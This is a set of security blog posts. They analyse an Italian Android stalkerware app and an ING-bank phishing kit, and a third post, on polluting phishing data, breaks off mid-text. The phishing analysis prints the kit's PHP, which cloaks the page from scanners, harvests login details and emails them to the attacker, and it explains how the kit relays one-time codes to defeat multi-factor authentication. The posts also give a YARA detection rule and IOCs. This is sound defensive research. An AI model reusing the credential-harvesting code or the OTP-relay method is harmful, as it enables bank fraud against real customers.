[{"content":" Picture from the Hacker News\nWhat is stalkerware? Stalkerware is a type of malicious software that is designed to track and monitor someone\u0026rsquo;s digital activity without their knowledge or consent. This type of software is often used by individuals who want to spy on their partners or children, or by employers who want to monitor the activity of their employees. Stalkerware can be used to track a wide range of digital activity, including web searches, geolocation, text messages and chats, photos, voice calls, and more. The use of stalkerware is generally considered unethical and may also be illegal, as it violates the privacy of the targeted individual.\nThese apps are often distributed as paid services outside of the Google Play Store, as Google\u0026rsquo;s Developer Program Policy prohibits the distribution of apps that collect and transmit personal or sensitive data from a device without adequate notice or consent (Developer Program Policy: September 16, 2020 announcement).\nIn this post, we will be focusing on a specific Android sample which was developed for the Italian market, as it was advertised in a website in Italian and the code of the sample contains numerous Italian expressions.\nThe website The app is described on the website as a tool for \u0026ldquo;secretly spying Android phones without being noticed by the owner of the smartphone\u0026rdquo;. The company behind the app claims to be active in 24 countries around the world, with headquarters in Europe, New Zealand, Brazil, and Canada.\nThe website of the app includes an End-User License Agreement (EULA) stating that the app should only be installed on devices owned by the user, and it also requires the user to notify any person using a device with the software installed, or any other person with the right to access a monitored account, of the presence of the software.\n\u0026lsquo;End-User License Agreement\u0026rsquo; from the website of the app. The highlighted section roughly translates to \u0026lsquo;you also agree to notify on the presence of the software any person using a device with the software installed, or any other person with the right to access a monitored account\u0026rsquo;.\nHowever, according to the company\u0026rsquo;s website, the most common reason that clients use their stalkerware service is for \u0026ldquo;relationship cheating\u0026rdquo; with 40% of respondents citing this as their motivation; 32% of respondents said that they were using the service to monitor their minor children, and 11% cited \u0026ldquo;personal curiosity, no real reason\u0026rdquo;.\n\u0026lsquo;Reasons for using the spy app\u0026rsquo; from the website of the app\nThe licensing model for this stalkerware app includes a free trial of 3 days, during which users have access to all of the features of the app and the online panel for viewing the data captured from the device. After the free trial expires, users must pay a fee of €22 per month to continue using the service. This fee can be paid via PayPal or credit card, after registering in the admin panel of the website.\nFeatures The list of features advertised include the ability to extract WhatsApp audios, pictures, and videos, access all media files on the phone, record calls and ambient audio, record the screen, report on notifications received, list installed apps, and track the phone\u0026rsquo;s location. The website of the app also claims that it is \u0026ldquo;invisible\u0026rdquo; to the user of the phone and to many antivirus solutions.\nTo use this stalkerware app, the user must have physical access to the victim\u0026rsquo;s phone and enable the installation of \u0026ldquo;unknown apps\u0026rdquo; from the Android settings. This process can be a bit tedious for non-experienced users, so the website provides various guides and short videos to help users download and install the app on different Android devices and access the panel to view the stolen information.\nAnalysis of the sample The apk sample can be downloaded directly from the website. At time of writing, the sample is not listed in VirusTotal, but we can use a small tool I wrote called apkingo to gather some information on the app:\nApp name:\tX Android Antivirus * General info PackageName:\tcom.vitefa.fosupevilucugo Version:\t1.0 MainActivity:\tcom.vitefa.fosupevilucugo.MainActivity MinimumSdk:\t22 (Android 5.1) TargetSdk:\t31 (Android 12) * Hash values Md5:\t67f5f3b3c858453fdc0c901d3f09f985 Sha1:\t86504d29d3d5a852e8e37c951c049917a9b11907 Sha256:\t5ab4ff9f8028c02cbb0886922142227732cfe3aaec99af1a5af2ddb43b0fb5a8 * Permissions android.permission.ACCESS_NETWORK_STATE android.permission.READ_SYNC_STATS android.permission.WRITE_SYNC_SETTINGS android.permission.AUTHENTICATE_ACCOUNTS android.permission.READ_SYNC_SETTINGS android.permission.ACCESS_COARSE_LOCATION android.permission.ACCESS_FINE_LOCATION android.permission.ACCESS_LOCATION_EXTRA_COMMANDS android.permission.ACCESS_NOTIFICATION_POLICY android.permission.ACCESS_WIFI_STATE android.permission.ACCESS_WIMAX_STATE android.permission.ACTION_MANAGE_OVERLAY_PERMISSION android.permission.BODY_SENSORS android.permission.BROADCAST_STICKY android.permission.CALL_PHONE android.permission.CAMERA android.permission.CHANGE_NETWORK_STATE android.permission.CHANGE_WIFI_MULTICAST_STATE android.permission.CHANGE_WIFI_STATE android.permission.CHANGE_WIMAX_STATE android.permission.DISABLE_KEYGUARD android.permission.GET_ACCOUNTS android.permission.INTERNET android.permission.MANAGE_ACCOUNTS android.permission.MODIFY_AUDIO_SETTINGS android.permission.PERSISTENT_ACTIVITY android.permission.PROCESS_OUTGOING_CALLS android.permission.PACKAGE_USAGE_STATS android.permission.READ_CELL_BROADCASTS android.permission.READ_CONTACTS android.permission.READ_EXTERNAL_STORAGE android.permission.READ_PHONE_STATE android.permission.READ_INSTALL_SESSIONS android.permission.READ_PROFILE android.permission.READ_SMS android.permission.RECEIVE_MMS android.permission.RECEIVE_SMS android.permission.RECORD_AUDIO android.permission.CAPTURE_AUDIO_OUTPUT android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS android.permission.RESTART_PACKAGES android.permission.SEND_SMS android.permission.SET_ALARM com.android.alarm.permission.SET_ALARM android.permission.USE_SIP android.permission.WAKE_LOCK android.permission.WRITE_CALENDAR android.permission.WRITE_CALL_LOG android.permission.WRITE_CONTACTS android.permission.WRITE_EXTERNAL_STORAGE android.permission.MANAGE_EXTERNAL_STORAGE android.permission.FOREGROUND_SERVICE com.donnemartin.android.fieldreporter.permission.MAPS_RECEIVE com.google.android.providers.gsf.permission.READ_GSERVICES android.permission.sec.MDM_APP_MGMT android.permission.ACCESS_BACKGROUND_LOCATION android.permission.MANAGE_OWN_CALLS android.permission.READ_CALL_LOG android.permission.ANSWER_PHONE_CALLS android.permission.USE_ICC_AUTH_WITH_DEVICE_IDENTIFIER android.permission.READ_PRIVILEGED_PHONE_STATE android.permission.SYSTEM_ALERT_WINDOW android.permission.SCHEDULE_EXACT_ALARM android.permission.MANAGE_MEDIA android.permission.VIBRATE * Metadata no metadata found * Certificate Serial:\t2126353726 Sha1:\tf3e17dfdb98b1f7774a16967fd1d84d3d9d59389 Subject:\tC=US, O=corudagiruducodi, CN=corudagiruducodi Issuer:\tC=US, O=corudagiruducodi, CN=corudagiruducodi ValidFrom:\t09 Dec 22 13:04 UTC ValidTo:\t23 Sep 96 13:04 UTC * Play Store app not found in Play Store This sample was named like an antivirus app, in order to make the victim think it is safe.\nIcon of this sample\nOne tactic commonly used by stalkerware apps is to request a large number of permissions from the user, including access to call logs, contacts, camera, messages, and microphone. This is often done without the user\u0026rsquo;s knowledge or consent, as stalkerware apps are designed to be installed behind the user\u0026rsquo;s back.\nRandomly generated package name The package name of an Android app is used to uniquely identifies the app on the device and in the stores; usually developers choose a package name with a reference to the company developing the app or the product, but in this sample the package name is a bit odd. Downloading multiple samples of the app from the website, it is possible to note that every apk has a different package name and different certificate issuer, and both appear to be randomly generated.\nThis approach could be used for evading antivirus detections based on the package name and the hash of the apk, as well as for distinguishing between different licenses. The randomly generated package name is specified in the strings.xml file, and here are these sections for two different samples:\n\u0026lt;string name=\u0026#34;ACCOUNT_TYPE\u0026#34;\u0026gt;com.vitefa.fosupevilucugo.sync\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;AUTORITY\u0026#34;\u0026gt;com.vitefa.fosupevilucugo.sync.StubProvider\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;ACCOUNT_TYPE\u0026#34;\u0026gt;com.babili.ribisosisubugu.sync\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;AUTORITY\u0026#34;\u0026gt;com.babili.ribisosisubugu.sync.StubProvider\u0026lt;/string\u0026gt; The strings ACCOUNT_TYPE and AUTORITY are referenced in the code while setting app the account of the service used to send the data to the online panel:\nDefinition of the \u0026lsquo;account\u0026rsquo; class using AUTORITY and ACCOUNT_TYPE\nGetting the PIN Right after installing the app, the following message will be shown: \u0026ldquo;Wait 5 seconds. Some windows may appear asking for authorization, accept and confirm everything. Below is a continuous button. After clicking on it, a numeric PIN will appear. You must enter the numeric PIN in our control panel, see the installation and license activation guides on our site. By clicking the continue button below you declare that you have read and accepted all the conditions on the site.\u0026rdquo;\nA screenshot showing part of the post-installation message\nThe PIN appearing after this prompt must be entered in the control panel to access the data stolen from the device. To retrieve this PIN, the app first attempts to generate a fingerprint of the device by gathering hardware and software information about it, like IMEI number, manufacturer and model, screen resolution, SDK version and build ID:\nThe function getPinFromServer is used to gather information about the device\nThe information obtained are then used to call the getPin function, which connects to the server, submits all the details gathered, and parses the response from the server to get the PIN associated with the license:\nThe function getPin is used to retrieve the PIN from the server\nExtracting and sending media files One of the major feature provided by the stalkerware app is the extraction of all the media files stored in the device, including pictures and videos from WhatsApp chats. This feature is provided by the extractMedia function, which is designed to access the external and internal storage of the device, and it contains a call to the getMedia function, which searches for media files within the specified directory and its subdirectories:\nContent ofextractMedia and getMedia functions\nThe getMedia function contains a call to getFile, which has the purpose of storing the name of the file found either in mediaWhatsapp or media (depending on where the file was found); both of these are SQL database used to store which files are send to the server. The function is then used to call FileClientNoDelete on every file.\nContent of getFile function\nContent of FileClientNoDelete and sendFile\nThe class FileClientNoDelete describes a client which can send a file to the remote server over a socket connection. When an object of FileClientNoDelete is created, it establishes a socket connection with the server at the specified IP address and port, and sets the timeout value of the socket to 15 minutes. Then it calls sendFile, which after writing the file name, the PIN number and the file lenght to the output stream of the socket, sends the specified file to the server by reading the file in 1024-byte chunks and writing them to the output stream until the end of the file is reached.\nScreen and audio recording This sample extends the Android class MediaProjection to capture screen contents and/or record system audio.\nThe function below is responsible for initializing, preparing, and starting the screen recording: it first retrieves the screen density of the device and initializes and prepare the media recorder by creating a MediaProjectionCallback instance, registering it with the media projection and creating a virtual display for the screen recording using the createVirtualDisplay function. Finally, it starts the media recorder and leave it working for 10 seconds, before stopping it.\nFunction used to setup recording of the screen\nA second class is used to capture audio from the device and record it to a file. The code below shows how the sample does this by creating an instance of AudioRecord and calling its startRecording() method. It then creates a new thread which will run a method called writeAudioDataToFile(), which will be responsible for writing the recorded audio data to a file.\nFunction used to setup audio recording\nAnother functionality of the stalkerware app is the recording of WhatsApp calls. The code below is activated during a WhatsApp call, and is able to detect the name or the number connected to the account having a call with the victim. The code then checks for a view with the resource name end_call_btn, and if it finds it, it calls the service rCallVoip to actually record the call.\nFunction used to record WhatsApp calls\nGPS location The sample is also able to get the device\u0026rsquo;s current location by using either GPS or the device\u0026rsquo;s mobile network.\nFunction used to obtain the position of the device\nThe function above checks if either GPS or the device\u0026rsquo;s mobile network is enabled on the device: if one of those is enabled, it starts listening for location updates from the chosen provider. When the device\u0026rsquo;s location changes, the method onLocationChanged is called to write latitute and longitude coordinates in an XML document:\nFunction called when the position of the device changes\nClosing remarks In conclusion, the android stalkerware app that was analyzed is a concerning and potentially dangerous tool. It has the ability to track a person\u0026rsquo;s location, access their messaging and call logs, and even record their phone calls without their knowledge or consent. This type of app can be used to stalk and harass individuals, and it raises serious privacy and security concerns. If you read this post and you now suspect there may be stalkerware on your device, refer to this article from the Coalition Against Stalkerware.\nMitre ATT\u0026amp;CK Tactics And Techniques TA0011 - Command and Control\nT1071 - Application Layer Protocol (uses HTTPS and performs DNS lookups) T1095 - Non-Application Layer Protocol (performs DNS lookups) T1573 - Encrypted Channel (uses HTTPS) TA0030 - Defense Evasion\nT1418 - Software Discovery (queries a list of installed applications) T1447 - Delete Device Data (lists and deletes files in the same context) TA0031 - Credential Access\nT1409 - Stored Application Data (queries stored mail and application accounts like Gmail or WhatsApp) T1412 - Capture SMS Messages (monitors incoming SMS) TA0032 - Discovery\nT1418 - Software Discovery (queries a list of installed applications) T1421 - System Network Connections Discovery (checks an internet connection is available) T1426 - System Information Discovery (queries the unqiue device ID) T1430 - Location Tracking (queries the phones location) TA0034 - Impact\nT1447 - Delete Device Data (lists and deletes files in the same context) T1448 - Carrier Billing Fraud (has permission to send SMS in the background) TA0035 - Collection\nT1409 - Stored Application Data (queries stored mail and application accounts like Gmail or WhatsApp) T1412 - Capture SMS Messages (monitors incoming SMS) T1429 - Audio Capture (accesses the audio/media managers and records audio/media) T1430 - Location Tracking (queries the phones location) T1432 - Access Contact List (queries phone contact information) T1433 - Access Call Log (monitors incoming and outgoing Phone calls) T1507 - Network Information Discovery (checks an internet connection is available) TA0038 - Network Effects\nT1449 - Exploit SS7 to Redirect Phone Calls/SMS (has permissions to perform, monitor, redirect and/or block calls and to send SMS in the background) YARA rule italianstalkerware : stalkerware { meta: author = \u0026#34;Andrea Palmieri @andpalmier\u0026#34; ref = \u0026#34;https://andpalmier.com/posts/stalkerware-analysis/\u0026#34; strings: $s1 = \u0026#34;DataMariaDbSalentoBellaSarda\u0026#34; nocase ascii $s2 = \u0026#34;IsScreenOnServiceMarinellaBella\u0026#34; ascii $s3 = \u0026#34;preInstallServiceAnacondameritocronicavolenzia\u0026#34; nocase ascii $s4 = \u0026#34;ScreenIsOnReceiverMarinellaBella\u0026#34; ascii condition: uint16(0) == 0x6564 and 4 of them } IOCs u1623673571u.apk\t86504d29d3d5a852e8e37c951c049917a9b11907 u187763837u.apk 19d990ace5e4fd5871265485d2ec4431bba33f28 u555625802u.apk\t8fbaa94dfdce19e5484e12bac0ce4cbe56d908d8 ","permalink":"https://andpalmier.com/posts/stalkerware-analysis/","summary":"Analysis of an Italian stalkerware for Android","title":"Dissecting an Android stalkerware"},{"content":" I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.\nLet\u0026rsquo;s start from the beginning I found this kit while analyzing the phishing sites reported by @illegalfawn. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.\nThe name of the zip is interesting: POSTEITASLIANE.zip. For non Italians, the name is referring to Poste Italiane, the Italian postal service provider, which also offers financial services and is often target of phishing pages.\nBesides having a typo in the name of the service, the kit - surprisingly - is not targeting Poste Italiane, but ING bank.\nThe phishing page\nExploring the kit This kit is quite large, as it contains 475 files and 48 directories. Many items are taken directly from the Italian ING webpage, such as images, stylesheet files and JS scripts.\nIf we check the metadata of the other files, we can see that they were modified on the 4th of March, indicating that this kit is recent:\n$ mdls index.php _kMDItemDisplayNameWithExtensions = \u0026#34;index.php\u0026#34; kMDItemContentCreationDate = 2021-03-04 16:16:56 +0000 kMDItemContentCreationDate_Ranking = 2021-03-04 00:00:00 +0000 kMDItemContentModificationDate = 2021-03-04 16:16:56 +0000 kMDItemContentModificationDate_Ranking = 2021-03-04 00:00:00 +0000 kMDItemContentType = \u0026#34;public.php-script\u0026#34; index.php The entry point of the kit is index.php:\n\u0026lt;?php session_start(); $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $hash = md5($ip); $url = \u0026#34;http://www.geoplugin.net/json.gp?ip=$ip\u0026#34;; function url_get_contents($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); $data = curl_exec($ch); curl_close($ch); return $data; } $json = url_get_contents($url); $json = json_decode($json, true); $country = $json[\u0026#39;geoplugin_countryName\u0026#39;]; # if($country == \u0026#34;Italy\u0026#34;||$country == \u0026#34;United Kingdom\u0026#34; || $country == \u0026#34;Bulgaria\u0026#34;) { $ban_file = \u0026#34;logs/banlist.txt\u0026#34;; $list = file($ban_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); if(in_array($ip, $list)) { header(\u0026#34;Location: https://www.google.com\u0026#34;); die(); } else { $_SESSION[\u0026#39;auth\u0026#39;] = true; header(\u0026#34;Location: login.php?\u0026amp;sessionid=$hash\u0026amp;securessl=true\u0026#34;); die(); } #} # } # else { # header(\u0026#39;Location: https://www.google.com\u0026#39;); # } ?\u0026gt; Part of the code is commented out, indicating that the developer was testing different approaches.\nIn the lines above, the kit uses geoplugin.net to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.\nThe code is then referring to a file called banlist.txt, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. banlist.txt is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the LinkedIn kit analyzed in a previous post.\nIn case the IP address of the victim is not in banlist.txt, the visitor is redirected to login.php with a new session ID, obtained from the md5 hash of the IP address.\nING Bank kit: login.php\nThe victim, by clicking on the link, is presented the page above, saying that the account of the visitor has been disabled temporarily for security reasons. If we click on the button, the message disappears, and we are now presented with a page asking for our client ID, birth date and phone number (you can see a screenshot of this page at the very beginning of this post).\nInterestingly, the page presents itself with a paragraph, on the left, where it says that \u0026ldquo;the codes entered will be doubly protected against phishing and spyware\u0026rdquo;, because after the visitor enters the login details, \u0026ldquo;it will be shown information which only ING can have\u0026rdquo;. Of course, this dialog is copied directly from the original ING login page for Italian customers, which you can see below:\nReal ING Bankg login page for Italian customers\nActually, a lot of the code of the page is copied directly from the original ING login page, but - of course - there are some small changes, especially in the forms.\nHere is the form from the original ING page:\n\u0026lt;form name=\u0026#34;aspnetform\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;./loginsso.aspx\u0026#34; onsubmit=\u0026#34;javascript :return webform_onsubmit();\u0026#34; id=\u0026#34;aspnetform\u0026#34; class=\u0026#34;vvc_form_enabled\u0026#34;\u0026gt; while this is the one of the kit:\n\u0026lt;form name=\u0026#34;aspnetForm\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;pin.php?\u0026amp;sessionid= \u0026lt;?php echo $hash; ?\u0026gt; \u0026amp;securessl=true\u0026#34; onsubmit=\u0026#34;javascript:return WebForm_OnSubmit();\u0026#34; id=\u0026#34;aspnetForm\u0026#34; class=\u0026#34;vvc_form_enabled\u0026#34;\u0026gt; The action attribute is different and - again - we see a submission with the parameters sessionid and securessl, with the first still being the hash of the IP address of the visitor. The fields submitted to the form are:\nCustomer code, with input name ctl00\\$cphContenuto\\$Login ContainerUC1\\$LoginStepCifUC1\\$txtcc Birth date, with input name ctl00\\$cphContenuto\\$Login ContainerUC1\\$LoginStepCifUC1\\$txtgg Phone number, with input name ctl00\\$cphContenuto\\$Login ContainerUC1\\$LoginStepCifUC1\\$txt pin.php Let\u0026rsquo;s see how they are used in pin.php:\nING Bank kit: pin.php\nThis page is asking for an OTP code that the victim should have received via SMS. This means that the actor is - either manually or with an automated agent - performing the login access to ING Bank with the credentials of the victim while the victim is still on the phishing page: otherwise the OTP code would expire and not useful for signing in. If the mechanics seems a bit confusing, don\u0026rsquo;t worry, I will make a summary of the details of the process before the conclusion of this post!\nFor now, let\u0026rsquo;s focus on the code, here is the beginning of the PHP for pin.php:\nif(!isset($_SESSION[\u0026#39;auth\u0026#39;])) { header(\u0026#34;Location: http://www.google.com\u0026#34;); die(); } $v_ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $hash = md5($v_ip); In the code above, the page is - once again - redirecting visitors which do not have the auth parameter to Google, to avoid detection.\nif(!empty($_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc\u0026#39;])) { $codclient=$_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc\u0026#39;]; $_SESSION[\u0026#39;codclient\u0026#39;] = $codclient; } if(!empty($_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg\u0026#39;])) { $giorno = $_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg\u0026#39;]; } if(!empty($_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm\u0026#39;])) { $mese = $_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm\u0026#39;]; } if(!empty($_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa\u0026#39;])) { $anno = $_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa\u0026#39;]; } This section is taking the parameters sent from login.php and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.\nif(!empty($_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt\u0026#39;])) { $telefono = $_POST[\u0026#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt\u0026#39;]; require \u0026#34;includes/my_email.php\u0026#34;; date_default_timezone_set(\u0026#39;Europe/London\u0026#39;); $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $time = date(\u0026#34;m-d-Y g:i:a\u0026#34;); $agent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; $msg = \u0026#34;+ ------------------------------------------+\\n\u0026#34;; $msg .= \u0026#34;+ Dati Login per $username\\n\u0026#34;; $msg .= \u0026#34;+ ------------------------------------------+\\n\u0026#34;; $msg .= \u0026#34;| codcliente: \u0026#34;.$codclient.\u0026#34;\\n\u0026#34;; $msg .= \u0026#34;| giorno: \u0026#34;.$giorno.\u0026#34;\\n\u0026#34;; $msg .= \u0026#34;| mese: \u0026#34;.$mese.\u0026#34;\\n\u0026#34;; $msg .= \u0026#34;| anno: \u0026#34;.$anno.\u0026#34;\\n\u0026#34;; $msg .= \u0026#34;| telefono: \u0026#34;.$telefono.\u0026#34;\\n\u0026#34;; $footer = \u0026#34;+ ------------------------------------------+\\n\u0026#34;; $footer .= \u0026#34;+ Sent from $v_ip on $time via $agent\\n\u0026#34;; $footer .= \u0026#34;+ ------------------------------------------+\\n\\n\u0026#34;; $data = $msg . $footer; $_SESSION[\u0026#39;login_info\u0026#39;] = $msg; $fp = fopen(\u0026#34;*********\u0026#34;, \u0026#34;a\u0026#34;); // HIDING LOG FILE fputs($fp,$data); fclose($fp); $subject = \u0026#34;Poste Login Info for User: $username\u0026#34;; $headers = \u0026#34;From: Poste Login Info \u0026lt;$my_email\u0026gt;\\r\\n\u0026#34;; $headers .= \u0026#34;Reply-To: Poste Login Info \u0026lt;$my_email\u0026gt;\\r\\n\u0026#34;; $headers .= \u0026#34;MIME-Version: 1.0\\r\\n\u0026#34;; $headers .= \u0026#34;Content-Type: text/plain; charset=utf-8\\r\\n\u0026#34;; mail($my_email,$subject,$data,$headers); } After assigning the last bit of information coming from login.php (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from includes/my_email.php and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).\nBelow you can find my_email.php (I have replaced the Gmail address with the asterisks):\n\u0026lt;?php $my_email = \u0026#34;***********@gmail.com\u0026#34;; //////// YOUR EMAIL GOES HERE ?\u0026gt; The comment \u0026ldquo;YOUR EMAIL GOES HERE\u0026rdquo; may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.\nHere is the content of the txt log file, which contains a sample of the data that the criminal will receive via email:\n+ ------------------------------------------+ + Dati Login per + ------------------------------------------+ | codcliente: 1111111 | giorno: 11 | mese: 01 | anno: 1111 | telefono: 111111111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ + ------------------------------------------+ + Dati Login per + ------------------------------------------+ | pin: 1111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ + ------------------------------------------+ + Dati Login per + ------------------------------------------+ | otp: 1111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ + ------------------------------------------+ + Dati Login per + ------------------------------------------+ | domanda1: 1111111 | domanda2: 1111111 | domanda3: 1111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).\nThe big picture Based on the logs pasted previously, it\u0026rsquo;s easy to have an idea of how the kit works:\nindex.php -\u0026gt; check if the IP of the visitor is in a blacklist, if that\u0026rsquo;s the case, redirect the connection to google.com login.php -\u0026gt; convince the victim to enter his/her client ID, phone number and birth date for \u0026ldquo;security reasons\u0026rdquo; and send them to the attacker via email. As soon as the criminal receives the stolen credentials, he/she will use them to sign in to the real ING e-banking platform. pin.php -\u0026gt; ask the victim to provide the PIN code for his account and send it via email to the criminal. Now the criminal will use it to continue the signin process to ING bank pretending to be the victim. After that, ING will send an OTP code to the victim\u0026rsquo;s phone because of the login process initiated by the criminal (which submitted the victim\u0026rsquo;s phone number). otp.php -\u0026gt; ask the victim to provide the OTP code he should have received from the bank, and send it via email to the criminal. Now the criminal enters the OTP code and (if the code is not expired) he/she should have access to the victim\u0026rsquo;s account. domande.php (it means questions in Italian) -\u0026gt; ask the victim to provide the answers to the security questions and send them via email to the criminal. This combination of questions/answers could be used as a backup mechanism to authenticate to ING. completa.php -\u0026gt; show a message to the victim says that it will be soon contacted by an operator. In this process, time has a crucial role, because OTP codes are valid only for some seconds (usually 60), thus the criminal either has an automatic agent to perform the login session with ING when the stolen credentials are received, or he/she will have to perform these actions manually and \u0026ldquo;live\u0026rdquo;.\nIn addition, at every step, the PHP code will store the credentials obtained in the previous step in log file, e.g. the code in pin.php will write the credentials obtained during the execution of login.php.\nBelow is a schema with the screenshots of the mentioned pages. I didn\u0026rsquo;t include index.php because it does not have any graphical elements; instead I replaced the first step with a dialog in login.php, which tries to convince the user to enter the security details of his/her account.\nSchema of the phishing kit\nIt\u0026rsquo;s interesting to note that the kit is performing some basic checks for some input fields (such as the birth date of the victim), but, in one of the final steps, it does not even specify which information should be entered in the form, indeed in domande.php we can only see some asterisks before the input field, which - in addition - accepts only numerical data.\nConclusion In this post, we analyzed a phishing kit targeting Italian customers of ING bank.\nA lot of the code-base of the kit was imported from the original ING page without too much caring. Indeed, while inspecting the network connection, we can see that the kit is trying to reach out to the ING private APIs without receiving an answer (probably because the APIs are checking that the request is coming from an authorized source).\nThe kit tries to access to the Italian ING APIs\nThe code includes a lot of comments and, in general, it seems that is still a work in progress; as a matter of fact, when it was online, it wasn\u0026rsquo;t able to lure many victims.\nThe ING kit shows how some criminals are trying to bypass Multi-Factor Authentication, by sending credentials (including OTP) via email as soon as these are stolen; and, probably in case they are not able to enter the OTP quick enough, they also try to steal the security questions, which are often used as a fallback mechanism to access the account.\n","permalink":"https://andpalmier.com/posts/phishing-findings-3/","summary":"Analysis of a phishing kit targeting ING Bank","title":"Phishing findings, campaign #3: ING bank"},{"content":" Introduction If you use Twitter to stay up to date with the latest security news, you may have noticed a community of researchers reporting phishing websites and scam pages everyday (if you want to follow them, phishunt.io have a good list of profiles in their community section).\nUnfortunately, reporting these websites is not always very effective. In many cases the phishing pages are removed only after 24-48 hours of being reported, and at that point they may have already stolen credentials from a lot of victims. In order to maximize their effectiveness in few hours, these campaigns are distributed via SMS or email, urging the potential victim to perform a \u0026ldquo;quick action\u0026rdquo;.\nA SMS used to distribute a phishing campaign. Picture from gov.uk\nIn order to make it more difficult for threat actors, I decided to work on a proof of concept of a tool that aims to pollute the data of phishing victims with random information, so that actors will have to either validate the data to discover which are authentic, or discard the database.\nBackground For this proof of concept, I choose to target a particular phishing kit, which I have reported multiple times:\nThe target of this poc: a phishing page for the Italian bank Intesa Sanpaolo\nThis kit is particularly suitable for this experiment, because it exposes the logs of the victims in a text file that is often left unprotected online.\nThis poses an additional security risk for the victims, because their credentials are not only in the hands of the actor who deployed the kit, but are also potentially accessible to other actors that can crawl the web for phishing kits alredy deployed by others.\nHowever, for the sake of this experiment, having the logs exposed makes it easier to verify if the code works as expected.\nThe phishing page In this case, we don\u0026rsquo;t have access to the PHP code of the kit, because I couldn\u0026rsquo;t find the zip in these domains. However I would be interested in analyzing it, so if you have it, please let me know!\nEven if we don\u0026rsquo;t have access to the PHP, we have everything we need in the HTML of the phishing page. Here is the form for entering the credentials:\n\u0026lt;div\u0026gt; \u0026lt;form id=\u0026#34;command\u0026#34; class=\u0026#34;form-group\u0026#34; action=\u0026#34;/core/login.php\u0026#34; method=\u0026#34;post\u0026#34; autocomplete=\u0026#34;off\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;p\u0026gt;\u0026lt;h2\u0026gt;\u0026lt;label for=\u0026#34;camp1\u0026#34;\u0026gt;Codice Titolare\u0026lt;/label\u0026gt;\u0026lt;/h2\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;input class = \u0026#34;form-control\u0026#34; type=\u0026#34;number\u0026#34; name=\u0026#34;codice\u0026#34; id=\u0026#34;_camp1\u0026#34; required tabindex=\u0026#34;1\u0026#34; value=\u0026#34;\u0026#34; minlength=\u0026#34;4\u0026#34; maxlength=\u0026#34;10\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;label for=\u0026#34;camp2\u0026#34;\u0026gt;PIN\u0026lt;/label\u0026gt;\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;number\u0026#34; type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;_camp2\u0026#34; required tabindex=\u0026#34;2\u0026#34; value=\u0026#34;\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;p\u0026gt;\u0026lt;strong\u0026gt; \u0026lt;label for=\u0026#34;camp3\u0026#34;\u0026gt;Numero di 